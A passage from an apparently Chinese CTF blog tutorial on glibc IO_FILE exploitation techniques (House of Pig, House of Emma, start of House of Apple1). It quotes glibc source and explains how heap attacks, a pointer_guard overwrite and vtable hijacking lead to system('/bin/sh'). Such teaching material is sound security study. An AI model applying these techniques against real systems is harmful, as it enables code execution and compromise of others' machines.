<code>_IO_flush_all_lockp</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line">	...</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 为了让
<code>_IO_flush_all_lockp</code> 能够调用执行到
<code>_IO_OVERFLOW</code> 从而调用 <code>_IO_str_overflow</code>
，需要满足如下条件： - <code>fp-&gt;_mode &lt;= 0</code> -
<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></p>
<p>由于 vtable 被劫持，程序之后会执行到 <code>_IO_str_overflow</code> 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      <span class="built_in">free</span> (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 首先注意 <code>_flag</code> 的值（通常设为
0），避免提前从函数返回。之后程序执行到下面这个关键位置。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">...</span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">...</span><br><span class="line"><span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line"><span class="built_in">free</span> (old_buf);</span><br></pre></td></tr></table></figure></div>
其中 <code>_IO_blen</code> 定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure></div>
<p>此时程序执行 <code>malloc</code> 函数完成 tcache stash unlink 攻击将
<code>__free_hook</code> 所在的 fake chunk 申请出来，随后执行
<code>memcpy</code> 函数，将 <code>fp-&gt;_IO_buf_base</code> 和
<code>fp-&gt;_IO_buf_end</code> 之间的数据复制到
<code>__free_hook</code> 所在 fake chunk 中，将 <code>__free_hook</code>
覆盖为 <code>system</code> 函数地址。最后将
<code>fp-&gt;_IO_buf_base</code> 指向的地址即 <code>/bin/sh</code>
字符串地址作为参数传入 <code>free</code> 函数得到 shell 。</p>
<p>glibc-2.34 起取消了 ptmalloc 中的各种 hook，但是仍然可以利用 house of
pig 实现任意地址写任意值，借助其他手段完成 get shell 。</p>
<p>例如<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/eznoted2b1405e" >这道题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。观察发现，<code>_IO_str_overflow</code>
中的 <code>memcpy</code> 实际上是通过 got 表调用的，因此我们可以构造多个
_IO_FILE 链将 <code>memcpy@got</code> 改写成 <code>system</code>
函数地址然后调用 <code>memcpy</code> 实现 get shell 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/957c20f5f1a3136e9e9d5ec880a4c8fb.png"
                     
alt="在这里插入图片描述" 
                > 一种构造方案如上图所示，四个 _IO_FILE
作用如下： - 第一个 _IO_FILE 调用 <code>_IO_str_overflow</code> 中的
<code>free</code> 函数将 <code>tcache_perthread_struct</code>
释放实现一次 House of IO 。 - 第二次 _IO_FILE 首先调用
<code>_IO_str_overflow</code> 中的 <code>malloc</code> 将
<code>tcache_perthread_struct</code> 申请出来，然后调用
<code>memcpy</code> 控制 <code>tcache_perthread_struct</code>
中的数据，使得其中的 <code>entires</code> 指向
<code>&amp;memcpy@got - 0x10</code> 。 - 第三次 _IO_FILE 首先调用
<code>_IO_str_overflow</code> 中的 <code>malloc</code> 将
<code>&amp;memcpy@got - 0x10</code> 申请出来，然后调用
<code>memcpy</code> 将 <code>memcpy@got</code> 覆盖为
<code>system</code> 函数地址，同时将 <code>&amp;memcpy@got - 0x10</code>
处写入 <code>/bin/sh</code> 字符串。 - 第四次 _IO_FILE 调用
<code>malloc</code> 再次将 <code>&amp;memcpy@got - 0x10</code>
申请出来然后调用 <code>memcpy</code> ，即 <code>system</code> 函数并传入
<code>&amp;memcpy@got - 0x10</code> 参数执行
<code>system("/bin/sh")</code> 。 ## House of Emma 如果
<code>vtable</code> 指向的 <code>_IO_file_jumps</code> 不可写，那么
House of Kiwi 这种攻击手法就会失效。这时候就需要考虑劫持 vtable
。但在新版 glibc ，之前的劫持 vtable 的方法已经失效。 - 由于自 libc-2.24
起对 vtable 指向的地址范围有检查，因此不能随便将 vtable 劫持到某块伪造了
<code>_IO_jump_t</code> 的内存上。 - 自 glibc-2.28
起，<code>_IO_str_jumps</code> 上的 <code>_IO_str_finish</code> 不再调用
<code>_IO_strfile</code>（IO_FILE 结构体） 上的函数指针。</p>
<p>因此需要寻找其他的危险函数来劫持程序流。</p>
<p>vtable 的合法范围内，还有另一个 <code>_IO_jump_t</code>
类型的函数表叫做 <code>_IO_cookie_jumps</code>
，其中有如下危险函数可供我们利用：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>_IO_cookie_file</code> 有如下定义： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure></div></p>
<p>因此攻击手法与前面的 <code>_IO_str_jumps</code>
相似，不过需要绕过指针保护 <code>PTR_DEMANGLE</code> 。</p>
<p>通过分析汇编可知，这段宏定义的操作是将函数指针循环右移 11 位然后与
<code>fs:[0x30]</code> 异或得到真正的函数地址。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/36b26ac6e793533e1a7c4189e34d6baa.png"
                     
alt="在这里插入图片描述" 
                > 我们知道， <code>fs:[0x28]</code> 是 tls
上存储的 canary，根据 <code>tcbhead_t</code>
结构体的定义，<code>fs[0x30]</code> 是 <code>pointer_guard</code>
，用于对指针进行加密。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sysdeps/x86_64/nptl/tls.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="type">void</span> *tcb;    <span class="comment">/* 指向TCB */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;       <span class="comment">/* 指向dtv数组 */</span></span><br><span class="line">  <span class="type">void</span> *self;   <span class="comment">/* 指向自身  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;    <span class="comment">/* canary值 */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;  <span class="comment">/* 用于保护指针 */</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></div>
<p>因此我们可以先泄露堆地址和 libc 基地址，然后利用 large bin attack 在
tls 对应 <code>pointer_guard</code> 上写一个 chunk
地址，从而绕过指针保护。</p>
<p>在实际调试时可以利用 canary 等方法查找 <code>pointer_guard</code>
地址，然后在攻击时根据 libc 基地址定位 <code>pointer_guard</code> 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/af639b064c55f2d2fc12070d4cf5e1a2.png"
                     
alt="在这里插入图片描述" 
                > 与 house of kiwi 一样，house of emma
也是通过 <code>__malloc_assert</code> 触发漏洞，但是由于
<code>pointer_guard</code>
已被修改，原来受保护的函数指针都已经无法调用，因此要选择最早调用的
<code>vtable</code> 中的函数进行触发，因此这里选择下面这个调用链：
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__fxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line">  <span class="type">int</span> res = __vfxprintf (fp, fmt, ap, <span class="number">0</span>);</span><br><span class="line">  va_end (ap);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__vfxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span><br><span class="line">	     <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    fp = <span class="built_in">stderr</span>;</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  <span class="type">int</span> res = locked_vfxprintf (fp, fmt, ap, mode_flags);</span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">locked_vfxprintf</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span></span><br><span class="line"><span class="params">		  <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_fwide (fp, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __vfprintf_internal (fp, fmt, ap, mode_flags);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> vfprintf	__vfprintf_internal</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap, <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  outstring ((<span class="type">const</span> UCHAR_T *) format,</span><br><span class="line">	     lead_str_end - (<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> outstring(String, Len)                          \</span></span><br><span class="line"><span class="meta">    do &#123;                                                \</span></span><br><span class="line"><span class="meta">        const void *string_ = (String);                 \</span></span><br><span class="line"><span class="meta">        done = outstring_func(s, string_, (Len), done); \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (done &lt; 0)                                   \</span></span><br><span class="line"><span class="meta">            goto all_done;                              \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PUT(F, S, N)	_IO_sputn ((F), (S), (N))  </span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">outstring_func</span> <span class="params">(FILE *s, <span class="type">const</span> UCHAR_T *<span class="built_in">string</span>, <span class="type">size_t</span> length, <span class="type">int</span> done)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert ((<span class="type">size_t</span>) done &lt;= (<span class="type">size_t</span>) INT_MAX);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>) PUT (s, <span class="built_in">string</span>, length) != (<span class="type">size_t</span>) (length))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> done_add_func (length, done);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 这里以同名题目<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house%20of%20emma" >2021湖湘杯
house of emma <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例讲解利用过程：</p>
<p>在利用 UAF 泄露 libc 和堆地址后，利用 2 次 large bin attack 分别覆盖
<code>pointer_guard</code> 和 <code>stderr</code> 指针为某 chunk
地址，然后作如下图所示构造。最后通过 <code>__malloc_asserrt</code>
触发漏洞。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a581688d6d87d4545d97df1aa93eb4db.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>需要注意的是，由于伪造的 IO_FILE 的 flag 的
<code>_IO_USER_LOCK</code>（0x8000）没有置位，因此在
<code>__vfxprintf</code> 函数中会执行如下代码： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9197cd36b1e6a2381782a2a0dd8b4a17.png"
                     
alt="在这里插入图片描述" 
                > 因此伪造的 IO_FILE 的 <code>_lock</code>
应该指向可读写的内存。 ## House of Apple1 在 IO_FILE 结构体中存在指针
<code>_wide_data</code> 指向一块 <code>_IO_wide_data</code>
类型的内存，<code>_IO_wide_data</code> 类型定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
通过 <code>_IO_wstrn_overflow</code> 函数可以在 <code>_wide_data</code>
指向的内存中写入连续 8 个 <code>snf-&gt;overflow_buf</code>
开始或结束位置的值。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">		 snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">				      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">				      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">					 / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 其中 <code>_IO_wstrnfile</code>
